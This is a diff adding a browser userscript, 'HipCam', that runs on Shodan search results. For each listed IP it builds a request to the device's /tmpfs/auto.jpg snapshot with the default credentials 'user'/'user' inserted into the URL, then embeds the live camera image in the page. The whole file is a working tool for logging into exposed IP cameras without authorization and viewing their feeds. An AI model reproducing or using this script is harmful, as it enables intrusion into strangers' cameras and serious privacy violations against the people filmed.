@@ -1,0 +1,51 @@
+// ==UserScript==
+// @name         HipCam
+// @author       Doerindabutt
+// @match        https://www.shodan.io/search?query*
+// @grant        GM_xmlhttpRequest
+// ==/UserScript==
+
+
+var ENABLED_SNAPSHOT = true;
+var IPs = [];
+var TIMEOUT_IN_MS = 1000;
+
+addCredentials = function(type, username, password, url)
+{
+        if(type == 1)
+        { // add at http
+                return url.replace("http://", "http://" + username + ":" + password + "@");
+        }
+        else
+        {
+                if(url.indexOf("?") > 0)
+                {
+                        url += "&";
+                }
+                else
+                {
+                        url += "?";
+                }
+                return url + "usr=" + username + "&pwd=" + password;
+        }
+};
+
+
+var shodanIPs = document.getElementsByClassName("ip");
+var i = 0;
+for(i = 0; i < shodanIPs.length; i++)
+{
+        var url = shodanIPs[i].getElementsByTagName("a")[0].href
+        var snapshot = addCredentials(2, "user", "user", url.replace ("https://www.shodan.io/host/", "http://") + "/tmpfs/auto.jpg");
+        var addition = "<br />";
+
+        if(ENABLED_SNAPSHOT)
+        {
+                addition += "<img onerror='this.style.display = \"none\"' src=\"" + snapshot + "\" /><br />"
+
+        }
+
+
+        shodanIPs[i].innerHTML += addition;
+}
+
